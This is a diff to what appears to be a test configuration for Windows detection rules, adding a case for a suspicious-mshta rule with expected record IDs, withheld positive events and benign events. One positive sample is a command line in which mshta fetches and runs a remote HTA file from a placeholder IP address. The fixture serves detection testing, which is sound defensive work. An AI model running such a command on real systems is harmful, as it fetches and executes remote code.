@@ -62,3 +62,39 @@ rules:
       - EventID: "1"
         Image: 'C:\Windows\System32\cmd.exe'
         CommandLine: 'cmd.exe /c echo schtasks /create C:\Users\Public\readme.txt'
+
+  - id: rule_03_suspicious_mshta
+    rule_path: rules/windows/proc_creation_mshta_suspicious.yml
+    log_path: tests/fixtures/mshta_execution/splunk-sysmon.log
+    logsource:
+      product: windows
+      category: process_creation
+    event_id: "1"
+    expected_event_count: 10
+    expected_positive_record_ids:
+      - "27317"
+      - "27526"
+      - "27738"
+      - "28976"
+      - "789720"
+      - "791666"
+    withheld_positive_events:
+      - EventID: "1"
+        Image: 'C:\Windows\SysWOW64\mshta.exe'
+        CommandLine: '"C:\Windows\SysWOW64\mshta.exe" "http://198.51.100.10/stage.hta"'
+      - EventID: "1"
+        Image: 'C:\Windows\System32\mshta.exe'
+        CommandLine: '"C:\Windows\System32\mshta.exe" "C:\Users\Public\update.hta"'
+    benign_events:
+      - EventID: "1"
+        Image: 'C:\Windows\System32\mshta.exe'
+        CommandLine: 'C:\Windows\System32\mshta.exe -Embedding'
+      - EventID: "1"
+        Image: 'C:\Windows\System32\mshta.exe'
+        CommandLine: '"C:\Windows\System32\mshta.exe" "C:\Program Files\VendorApp\help.hta"'
+      - EventID: "1"
+        Image: 'C:\Windows\System32\cmd.exe'
+        CommandLine: 'cmd.exe /c echo https://example.com'
+      - EventID: "1"
+        Image: 'C:\Program Files\Google\Chrome\Application\chrome.exe'
+        CommandLine: 'chrome.exe https://example.com'
